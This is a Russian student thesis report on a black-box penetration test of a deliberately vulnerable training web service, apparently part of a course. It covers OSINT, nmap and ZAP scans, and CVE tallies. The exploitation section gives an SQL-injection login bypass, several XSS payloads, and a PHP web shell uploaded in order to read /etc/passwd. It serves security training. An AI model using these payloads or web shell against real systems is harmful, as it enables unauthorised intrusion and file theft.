# Дипломная работа по профессии «Специалист по информационной безопасности»

## Тема диплома: Track Penetration Testing

### Студент: Зайцев Александр Юрьевич гр. SIB-46 2025г.

### Аннотация:  
 
Этот отчет содержит результаты проверки безопасности веб-сервиса 92.51.39.106. Проверка проводилась методом черного ящика по стандартным этапам: разведка, сканирование, поиск уязвимостей и составление отчета.
Были проверены два веб-приложения на портах 8050 и 7788. Обнаружены многочисленные критические уязвимости, такие как:
* SQL-инъекции и выполнение команд на сервере.
* Межсайтовый скриптинг (XSS).
* Возможность чтения системных файлов.
* Небезопасная загрузка файлов, позволившая выполнить код на сервере.
Каждая уязвимость подтверждена, оценена по степени риска и снабжена рекомендациями по исправлению. Отчет показывает серьезные пробелы в безопасности и служит основой для их устранения.

## Вводные данные:
### Задача
Нужно протестировать сервис на безопасность — провести полноценое тестирование на проникновение методом чёрного ящика. Известен только адрес тестируемого приложения — 92.51.39.106.

### Исходные данные
Требования к тестированию. Тестирование должно проходить в рамках пентеста приложения, поэтапно, без деструктивных действий в сторону сервисов и других тестеров. Рекомендуем использовать полезные материалы и open source инструменты, рассмотренные на курсе.


## Этап 1. OSINT
<details>
<summary> Критерии достижения: </summary>

* Собрано необходимое количество информации о сервисе, были использованы различные сервисы для получения инфомрации — Google, Shodan, CVE Details.
* Собранная информация систематизирована, имеет прямое отношение к тестируемому сервису, имеет ценность для тестирвоания.
* Полученная информация оценена и проанализирована.
</details>

На первом этапе использовали сервисы:
* www.shodan.io
* www.criminalip.io
* www.google.com
* www.cvedetails.com

Результаты сбора информации:

### Shodan.io:

GeneralInformation  

| Параметр | Значение |
|:-----------|:----------|
| Hostnames | 1427771-cg36175.tw1.ru |
| Domains | tw1.ru |
| Country | Russian Federation |
| City | Saint Petersburg |
| Organization | TimeWeb Ltd. |
| ISP | TimeWeb Ltd. |
| ASN | AS9123 |
| Operating System | Linux |

WebTechnologies  

| Параметр | Значение |
|:-----------|:----------|
| Operating systems | Ubuntu |
| Programming languages | PHP 5.5.9 |
| Web servers | Apache HTTP Server 2.4.7 |

OpenPorts  

| Параметр | Значение |
|:-----------|:----------|
| 22 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 8050 | Apache/2.4.7 (Ubuntu) NetologyVulnApp.com |
| 10050 | |

Так же найдено множество уязвимостей на порту 8050

Vulnerabilities  

| Параметр | Значение |
|:-----------|:----------|
| Critical | 93 |
| High | 134 |
| Medium | 100 |
| Low | 7 |


В связи с тем, что по порту 10050 никакой информации сервис не выдал, проверил порт через nmap
```
nmap -sV -sC -p 10050 92.51.39.106
```
Получил информацию, что на порту висит zabbix-agent

[Выявленные уязвимости](./docs/shodan.md)  
[Скриншоты](./docs/shodanscreen.md)






### criminalip.io

Сервис сразу предупреждает:
* This is a malicious IP Address.
* This IP Address has critical vulnerabilities.

Connection  

| Параметр | Значение |
|:-----------|:----------|
| IP Address Owner | Jsc timeweb |
| Hostname | 1427771-cg36175.tw1.ru |
| Country | Russian Federation |

Current Open Ports  

| Параметр | Значение |
|:-----------|:----------|
| TCP 22 | OpenSSH 8.2p1 |
| TCP 8050 | Apache 2.4.7 NetologyVulnApp.com |

WHOIS  

| Параметр | Значение |
|:-----------|:----------|
| ASN | 9123 |
| AS Name | Jsc timeweb |
| Organization Name | TIMEWEB |
| Country Code | RU |
| Country | Russian Federation |
| Region | St.-Petersburg |
| City | St Petersburg |
| Postal Code | 195213 |

Security  

| Параметр | Значение |
|:-----------|:----------|
| Abuse Record | 0 |
| Open Ports | 2 |
| Vulnerabilities | 68 | 
| Exploit DB| 6 | 
| Policy Violation | 1 |
| Remote Address | True |
| Network Device | 0 |
| Admin Page | False |
| Invalid SSL | False |

[Скриншоты](./docs/criminalip.md)


### Google 


#### Поиск проиндексированных страниц:  
site:92.51.39.106  
Beemer  
http://92.51.39.106:7788/

NetologyVulnApp.com  
http://92.51.39.106:8050/users/home.php

NetologyVulnApp.com  
http://92.51.39.106:8050/calendar.php?date=1754793652

Admin Area  
http://92.51.39.106:8050/admin/index.php?page=login

[Скриншоты](./docs/google.md)


Судя по результатам есть еще задействованный порт 7788

Через nmap посмотрел что на данном порту:   
nmap -sV -sC -p 7788 92.51.39.106
Получил ответ:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-12 23:03 CET
Nmap scan report for 1427771-cg36175.tw1.ru (92.51.39.106)
Host is up (0.078s latency).

PORT     STATE SERVICE VERSION
7788/tcp open  http    Tornado httpd 5.1.1
|_http-server-header: TornadoServer/5.1.1
|_http-title: Beemer

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
```

#### Поиск административных панелей
inurl:admin site:92.51.39.106

Результат:  
http://92.51.39.106:8050/admin/index.php?page=login

#### Поиск утечек баз данных
filetype:sql site:92.51.39.106
Результата нет  

--------------------

По итогам имеем:
* Порт 8050 - Apache 2.4.7 и PHP 5.5.9
* Порт 7788 - Tornado 5.1.1
* Порт 22 - OpenSSH 8.2p1
* Порт 10050 - Zabbix Agent

### Cvedetails

#### Анализ уязвимостей Apache HTTP Server 2.4.7

```
https://www.cvedetails.com/version/524064/Apache-Http-Server-2.4.7.html
```

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_apache_1.PNG)
</details>

```
https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-524064/Apache-Http-Server-2.4.7.html
```

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_apache_2.PNG)
</details>



**Общая статистика:**
- Всего обнаружено уязвимостей: 79
- Критические (CVSS ≥ 9.0): 19
- Высокие (CVSS 7.0-8.9): 25
- Средние (CVSS 4.0-6.9): 35

**Наиболее критические уязвимости:**

| CVE | CVSS | Описание | Влияние |
|-----|------|----------|---------|
| CVE-2024-38475 | 9.1 | RCE через mod_rewrite | Выполнение кода |
| CVE-2021-40438 | 9.0 | SSRF в mod_proxy | Обход фаервола |
| CVE-2017-3167 | 9.8 | Обход аутентификации | Доступ к системе |
| CVE-2016-0736 | 7.5 | Уязвимость сессий | Кража сессий |
| CVE-2016-2161 | 7.5 | DoS атака | Отказ обслуживания |

**Вывод:** Использование устаревшей версии Apache 2.4.7 создает 44 критические 
и высокие уязвимости в системе, включая возможности удаленного выполнения кода, 
обхода аутентификации и отказа в обслуживании.



______________________________________________________________________________________


#### Поиск уязвимостей для PHP 5.5.9

```
https://www.cvedetails.com/version/517980/PHP-PHP-5.5.9.html
```

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_php_1.PNG)
</details>

```
https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/version_id-517980/PHP-PHP-5.5.9.html
```

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_php_2.PNG)
</details>

**Общая статистика:**
- Всего обнаружено уязвимостей: 226
- Критические (CVSS ≥ 9.0): 89
- Высокие (CVSS 7.0-8.9): 92
- Средние (CVSS 4.0-6.9): 45

**Наиболее критические уязвимости:**

| CVE | CVSS | Описание | Влияние |
|-----|------|----------|---------|
| CVE-2015-0235 | 10.0 | GHOST - уязвимость в glibc | RCE |
| CVE-2019-11043 | 9.8 | RCE в php-fpm | Выполнение кода |
| CVE-2016-7124 | 9.8 | Обход ограничений десериализации | RCE |
| CVE-2015-8866 | 9.6 | XXE уязвимость | Чтение файлов |
| CVE-2016-5385 | 8.1 | HTTPoxy | Перехват трафика |


**Вывод:** Использование устаревшей версии PHP 5.5.9 создает 181 критическую 
и высокую уязвимость в системе, включая множественные векторы для удаленного 
выполнения кода, чтения произвольных файлов и обхода механизмов безопасности.



______________________________________________________________________________________


#### Анализ уязвимостей Tornado 5.1.1

```
https://www.cvedetails.com/version/1513656/Tornadoweb-Tornado-5.1.1.html
```
<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_tor_1.PNG)
</details>

```
https://www.cvedetails.com/vulnerability-list/vendor_id-11965/product_id-22364/version_id-1513656/Tornadoweb-Tornado-5.1.1.html

```

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_tor_2.PNG)
</details>


**Общая статистика:**
- Всего обнаружено уязвимостей: 3
- Высокие (CVSS ≥ 7.0): 2
- Средние (CVSS 4.0-6.9): 1

**Найденные уязвимости:**

| CVE | CVSS | Описание | Влияние |
|-----|------|----------|---------|
| CVE-2025-47287 | 7.5 | DoS через multipart парсер | Отказ обслуживания |
| CVE-2024-52804 | 7.5 | DoS через парсинг cookies | Истощение CPU |
| CVE-2023-28370 | 6.1 | Open Redirect | Фишинг атаки |

**Вывод:** Tornado 5.1.1 содержит несколько критических уязвимостей, 
позволяющих осуществлять DoS атаки и фишинг. Рекомендуется обновление 
до актуальной версии.


______________________________________________________________________________________


#### Анализ уязвимостей OpenSSH 8.2p1

```
https://www.cvedetails.com/version/639204/Openbsd-Openssh-8.2.html
```
<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_ssh_1.PNG)
</details>

```
https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-639204/Openbsd-Openssh-8.2.html?page=1&order=3
```
<details>
<summary> Скриншот </summary>

![Изображение](./img/slide1_ssh_2.PNG)
</details>


**Общая статистика:**
- Всего обнаружено уязвимостей: 14
- Критические (CVSS ≥ 9.0): 1
- Высокие (CVSS 7.0-8.9): 6
- Средние (CVSS 4.0-6.9): 6
- Низкие (CVSS 0.1-3.9): 1

**Наиболее критические и важные уязвимости:**

| CVE | CVSS | Компонент | Описание | Влияние |
|-----|------|-----------|----------|---------|
| CVE-2023-38408 | 9.8 | ssh-agent | RCE через PKCS#11 | Полный компромисс |
| CVE-2020-15778 | 7.8 | scp | Инъекция команд | RCE на клиенте |
| CVE-2020-12062 | 7.5 | scp | Перезапись файлов | Потеря данных |
| CVE-2021-28041 | 7.1 | ssh-agent | Double Free | RCE |
| CVE-2021-41617 | 7.0 | sshd | Эскалация привилегий | Повышение прав |
| CVE-2025-26465 | 6.8 | ssh client | MitM атака | Обход аутентификации |
| CVE-2023-51385 | 6.5 | ssh client | Инъекция команд | RCE |


**Вывод:** OpenSSH 8.2p1 содержит множество критических уязвимостей, 
включая RCE через ssh-agent и инъекции команд в scp. Рекомендуется 
немедленное обновление до актуальной версии OpenSSH.


______________________________________________________________________________________


#### Сводный анализ безопасности инфраструктуры

** Сравнительный анализ уязвимостей**

| Компонент | Версия | Всего уязвимостей | Критические | Высокие | Средние |
|-----------|--------|-------------------|-------------|---------|---------|
| Apache HTTP Server | 2.4.7 | 79 | 19 | 25 | 35 |
| PHP | 5.5.9 | 226 | 89 | 92 | 45 |
| Tornado | 5.1.1 | 3 | 0 | 2 | 1 |
| OpenSSH | 8.2p1 | 14 | 1 | 6 | 6 |
| **ИТОГО** | | **322** | **109** | **125** | **87** |

**Ключевые выводы**

**Критические риски**
- **PHP 5.5.9** - представляет наибольшую угрозу (226 уязвимостей, включая 89 критических)
- **OpenSSH 8.2p1** - содержит уязвимость RCE через ssh-agent (CVE-2023-38408, CVSS 9.8)
- **Apache 2.4.7** - множественные уязвимости удаленного выполнения кода

** Высокие риски**
- **OpenSSH** - инъекция команд в scp (CVE-2020-15778, CVSS 7.8)
- **PHP** - 92 уязвимости высокого уровня риска
- **Apache** - 25 высокорисковых уязвимостей
- **Tornado** - 2 уязвимости DoS типа

Исходя из результатов OSINT определяемся с целями:

- http://92.51.39.106:8050/ (NetologyVulnApp.com, Apache/2.4.7, PHP/5.5.9)
- http://92.51.39.106:7788/ (Beemer, TornadoServer/5.1.1)



## Этап 2. Scanning
Цель: Активное сканирование для обнаружения открытых портов, сервисов и автоматического выявления известных уязвимостей.

### Шаг 2.1. Сканирование портов и сервисов с помощью Nmap

#### Базовое сканирование

```
nmap -sV -sC -p 22,7788,8050,10050 -oA nmap_basic_scan 92.51.39.106
```

Результаты:
```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 35818ada5019aa65c195ad2fdba9eaed (RSA)
|   256 7bc83edcd6707737bea5726d205bee8f (ECDSA)
|_  256 31f56db5346a96fd975c5e4e2c64fc4f (ED25519)
7788/tcp  open  http          Tornado httpd 5.1.1
8050/tcp  open  unknown
10050/tcp open  zabbix-agent?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide2_nmap_1.PNG)
</details>

#### Полное сканирование всех TCP-портов

```
nmap -sS -p- -oA nmap_full_tcp_scan 92.51.39.106
```

Результаты:

```
Nmap scan report for 1427771-cg36175.tw1.ru (92.51.39.106)
Host is up (0.071s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
135/tcp   filtered msrpc
138/tcp   filtered netbios-dgm
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
7788/tcp  open     unknown
8050/tcp  open     unknown
10050/tcp open     zabbix-agent
```

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide2_nmap_2.PNG)
</details>



#### Сканирование с использованием скрипта для поиска уязвимостей

```
nmap -sV -p 22,7788,8050,10050 --script vulners -oA nmap_vulners_scan 92.51.39.106
```

Результаты:

<details>
<summary> Развернуть </summary>

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:8.2p1:
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807    *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23    *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623    *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC    *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0    *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587    *EXPLOIT*
|       BA3887BD-F579-53B1-A4A4-FF49E953E1C0    8.1     https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0    *EXPLOIT*
|       4FB01B00-F993-5CAF-BD57-D7E290D10C1F    8.1     https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F    *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    7.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    *EXPLOIT*
|       2E719186-2FED-58A8-A150-762EFBAAA523    7.8     https://vulners.com/gitee/2E719186-2FED-58A8-A150-762EFBAAA523 *EXPLOIT*
|       23CC97BE-7C95-513B-9E73-298C48D74432    7.8     https://vulners.com/githubexploit/23CC97BE-7C95-513B-9E73-298C48D74432    *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    7.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207    *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       CVE-2020-12062  7.5     https://vulners.com/cve/CVE-2020-12062
|       CNVD-2020-36277 7.5     https://vulners.com/cnvd/CNVD-2020-36277
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       CVE-2021-28041  7.1     https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       284B94FC-FD5D-5C47-90EA-47900DAD1D1E    7.0     https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E    *EXPLOIT*
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254    *EXPLOIT*
|       85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0    6.8     https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0    *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       D104D2BF-ED22-588B-A9B2-3CCC562FE8C0    6.5     https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0    *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       C07ADB46-24B8-57B7-B375-9C761F4750A2    6.5     https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2    *EXPLOIT*
|       A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C    6.5     https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C    *EXPLOIT*
|       65B15AA1-2A8D-53C1-9499-69EBA3619F1C    6.5     https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C    *EXPLOIT*
|       5325A9D6-132B-590C-BDEF-0CB105252732    6.5     https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732 *EXPLOIT*
|       530326CF-6AB3-5643-AA16-73DC8CB44742    6.5     https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742    *EXPLOIT*
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CNVD-2021-25272 5.9     https://vulners.com/cnvd/CNVD-2021-25272
|       6D74A425-60A7-557A-B469-1DD96A2D8FF8    5.9     https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8    *EXPLOIT*
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       CVE-2025-61985  3.6     https://vulners.com/cve/CVE-2025-61985
|       CVE-2025-61984  3.6     https://vulners.com/cve/CVE-2025-61984
|       B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150    3.6     https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150    *EXPLOIT*
|       4C6E2182-0E99-5626-83F6-1646DD648C57    3.6     https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57    *EXPLOIT*
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
7788/tcp  open  http          Tornado httpd 5.1.1
|_http-server-header: TornadoServer/5.1.1
| vulners:
|   cpe:/a:tornadoweb:tornado:5.1.1:
|       CVE-2025-47287  7.5     https://vulners.com/cve/CVE-2025-47287
|       CVE-2024-52804  7.5     https://vulners.com/cve/CVE-2024-52804
|       VERACODE:40660  6.1     https://vulners.com/veracode/VERACODE:40660
|_      CVE-2023-28370  6.1     https://vulners.com/cve/CVE-2023-28370
8050/tcp  open  unknown
10050/tcp open  zabbix-agent?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.04 seconds
</details>

<details>
<summary> Скриншот </summary>

![Изображение](./img/slide2_nmap_3.PNG)
</details>


### Итоговые результаты сканирования Nmap

#### Открытые порты и сервисы

В результате сканирования обнаружены следующие открытые порты:

| Порт | Сервис | Версия | Состояние |
|------|--------|---------|-----------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 | **Открыт** |
| 7788/tcp | HTTP | Tornado httpd 5.1.1 | **Открыт** |
| 8050/tcp | HTTP | Не идентифицирован (вероятно Apache/PHP) | **Открыт** |
| 10050/tcp | Zabbix Agent | Не идентифицирована версия | **Открыт** |

**Фильтрованные порты Windows NetBIOS:** 135/tcp, 138/tcp, 139/tcp, 445/tcp - вероятно, блокируются межсетевым экраном.

#### Детальный анализ уязвимостей по сервисам

#### OpenSSH 8.2p1 (порт 22)
**Критические уязвимости:**
- **CVE-2023-38408** (CVSS 9.8) - RCE через ssh-agent при использовании PKCS#11
- **CVE-2020-15778** (CVSS 7.8) - Инъекция команд через SCP клиент

**Высокорисковые уязвимости:**
- CVE-2020-12062 (7.5) - Перезапись файлов через SCP
- CVE-2021-28041 (7.1) - Уязвимость Double Free в ssh-agent
- CVE-2021-41617 (7.0) - Эскалация привилегий в sshd

#### Tornado 5.1.1 (порт 7788)
**Высокорисковые уязвимости:**
- **CVE-2025-47287** (CVSS 7.5) - DoS атака через multipart парсер
- **CVE-2024-52804** (CVSS 7.5) - DoS через парсинг cookies (квадратичная сложность)

**Средние уязвимости:**
- CVE-2023-28370 (6.1) - Open Redirect уязвимость

#### HTTP-сервис порта 8050
Сервис не был корректно идентифицирован Nmap, однако по данным OSINT:
- **Apache 2.4.7** - 44 критические/высокие уязвимости
- **PHP 5.5.9** - 181 критическая/высокая уязвимость

#### Zabbix Agent (порт 10050)
Версия не определена, требует дополнительного исследования. Zabbix Agent может содержать уязвимости удаленного выполнения кода при неправильной настройке

#### Выводы по этапу сканирования

#### Критические риски:

1. **Устаревшее программное обеспечение**
2. **OpenSSH 8.2p1** - содержит критические уязвимости удаленного выполнения кода (CVE-2023-38408)
3. **Веб-сервисы** - используют устаревшие версии Apache и PHP с большим количеством уязвимостей
4. **Неидентифицированные сервисы** - порт 8050 и Zabbix Agent требуют дополнительного исследования


### Сканирование через ZAP Docker

Сканирование проводилось через VDS расположенный в Сербии. Запуск сканирования через локальный ПК с установленным KALI не давал результата из-за проблем с доступностью сервера.
По итогу сканирование порта 8050 произошло 21 ноября, 7788 23 ноября

Скриншоты запущенных docker присоединяю

![scrin_docker](./img/zap_docker.jpg)

#### Отчеты:
#### Сканирование порта 8050
```
sudo docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py -t http://92.51.39.106:8050 -g gen.conf -r zap_report_8050.html

```

Файл из отчета:
[Отчет ZAP 8050](https://htmlpreview.github.io/?https://github.com/AgvidoDev/sib-Diplom-Track-Penetration-Testing/blob/main/docs/zap_report_8050.html)

#### Краткий отчет:
Результаты:

| Уровень риска | Предупреждений |
|------|--------|
| Высокий | 1 |
| Средний | 6 |
| Низкий | 9 |
| Информационный | 9 |


#### Детальный:
Высокий риск:
1 категория - Cross Site Scripting (DOM Based)
Кол-во инстансов 9, критичность высокая


Средний риск:
6 категорий:
- Absence of Anti-CSRF Tokens - 8 инстансов
- Content Security Policy (CSP) Header Not Set - 11 инстансов
- HTTP Only Site - 1 инстанс
- Missing Anti-clickjacking Header - 11 инстансов
- Relative Path Confusion - 6 инстансов
- XSLT Injection - 2 инстанса

Низкий риск:
9 категорий:
- Cookie No HttpOnly Flag - 2 инстанса
- Cookie without SameSite Attribute - 2 инстанса
- In Page Banner Information Leak - 5 инстансов
- Insufficient Site Isolation Against Spectre Vulnerability - 9 инстансов
- Permissions Policy Header Not Set - 11 инстансов
- Server Leaks Information via "X-Powered-By" HTTP Header - 11 инстансов
- Server Leaks Version Information via "Server" HTTP Header - 11 инстансов
- Timestamp Disclosure - Unix - 5 инстансов
- X-Content-Type-Options Header Missing - 11 инстансов

Информационные:
9 категорий
- Authentication Request Identified - 1
- Cookie Slack Detector - 42
- GET for POST - 1
- Information Disclosure - Sensitive Information in URL - 1
- Non-Storable Content - 9
- Session Management Response Identified - 2
- Storable and Cacheable Content - 2
- User Agent Fuzzer - 235
- User Controllable HTML Element Attribute (Potential XSS) - 1


#### Рекомендации:
- Устранить DOM-based XSS уязвимости
- Реализовать защиту от CSRF-атак
- Настроить HTTPS и перенаправление с HTTP



#### Сканирование порта 7788
```
sudo docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py -t http://92.51.39.106:7788 -g gen.conf -r zap_report_7788.html

```

Файл из отчета:
[Отчет ZAP 7788](https://htmlpreview.github.io/?https://github.com/AgvidoDev/sib-Diplom-Track-Penetration-Testing/blob/main/docs/zap_report_7788.html)

#### Краткий отчет:
Результаты:

| Уровень риска | Предупреждений |
|------|--------|
| Высокий | 6 |
| Средний | 7 |
| Низкий | 5 |
| Информационный | 7 |



#### Детальный 

Высокий риск:
6 категорий:
- Cross Site Scripting (DOM Based) - 1 инстанс
- Cross Site Scripting (Reflected) - 1 инстанс
- Path Traversal - 1 инстанс
- Remote OS Command Injection - 1 инстанс
- Remote OS Command Injection (Time Based) - 2 инстанса
- SQL Injection - 2 инстанса

Средний риск:
7 категорий:
- Absence of Anti-CSRF Tokens - 7 инстансов
- Anti-CSRF Tokens Check - 4 инстанса
- Content Security Policy (CSP) Header Not Set - 11 инстансов
- HTTP Only Site - 1 инстанс
- Integer Overflow Error - 1 инстанс
- Missing Anti-clickjacking Header - 11 инстансов
- Vulnerable JS Library - 2 инстанса

Низкий риск:
5 категорий:
- Application Error Disclosure - 1 инстанс
- Insufficient Site Isolation Against Spectre Vulnerability - 9 инстансов
- Permissions Policy Header Not Set - 11 инстансов
- Server Leaks Version Information via "Server" HTTP Header - 11 инстансов
- X-Content-Type-Options Header Missing - 11 инстансов

Информационные:
7 категорий:
- Authentication Request Identified - 1
- GET for POST - 1
- Information Disclosure - Suspicious Comments - 2
- Modern Web Application - 11
- Storable and Cacheable Content - 11
- User Agent Fuzzer - 12
- User Controllable HTML Element Attribute (Potential XSS) - 6

#### Рекомендации:
- Устранить SQL Injection уязвимости
- Устранить уязвимость Remote OS Command Injection
- Исправить Path Traversal
- Устранить XSS уязвимости
- Обновить уязвимые JS библиотеки
- Реализовать CSRF защиту
- Настроить все необходимые заголовки безопасности

## Этап 3 - тестирование

### Тестирование веб-приложения NetologyVulnApp (92.51.39.106:8050)

#### Эксплуатация SQL Injection в форме авторизации.
- Страница входа http://92.51.39.106:8050/users/login.php
```
Username > admin' or '1'='1'#
Password > 1111
(пароль любой)
```

Результат:
![SQL Injection](./img/test_sql_in_01.jpg)
![SQL Injection](./img/test_sql_in_02.jpg)



#### Тестирование уязвимостей Cross-Site Scripting (XSS).

#### DOM-based XSS в гостевой книге:
- Страница входа http://92.51.39.106:8050/guestbook.php
- В поле комментария вводим:
```
<script>alert('XSS DOM-Based')</script>
````

Результат:
![XSS DOM-Based](./img/test_comm_01.jpg)
![XSS DOM-Based](./img/test_comm_02.jpg)


#### Reflected XSS в форме поиска:
- Любая страница, строка поиска http://92.51.39.106:8050/
- В поле поиска вводим код 
```
<a href="#" onclick="alert('XSS Reflected')">Netology</a>
```

Результат:
![XSS Reflected](./img/test_search_01.jpg)
![XSS Reflected](./img/test_search_02.jpg)
![XSS Reflected](./img/test_search_03.jpg)


#### Stored (Persistent) XSS в комментариях к фото:
- Страница просмотра первого изображения http://92.51.39.106:8050/pictures/view.php?picid=15
- В форму комментария вводим
```
<script>alert('Stored XSS')</script>
```

Результат:
![Stored XSS](./img/test_com_img_01.jpg)
![Stored XSS](./img/test_com_img_02.jpg)


#### Проверка уязвимости File Inclusion через загрузку веб-шелла.
- Страница http://92.51.39.106:8050/pictures/upload.php
- Загружаем подготовленный файл shell.php с кодом:
```
<?php
if (isset($_REQUEST['cmd'])) {
    system($_REQUEST['cmd']);
}
?>
```

* Создать файл shell.php с кодом, выполняющим системные команды (например, с использованием shell_exec и HTML-формы для ввода).
* Эксплуатация:
* Загрузить shell.php на сервер.
* Найти путь к загруженному файлу через интерфейс приложения (например, в /upload/PHP/).
* Перейти по прямой ссылке на файл и убедиться в его исполнении.
* Ввести команду cat /etc/passwd в форму шелла и получить содержимое системного файла.
* Доказательство: Скриншоты успешной загрузки файла, интерфейса веб-шелла и результата выполнения команды.
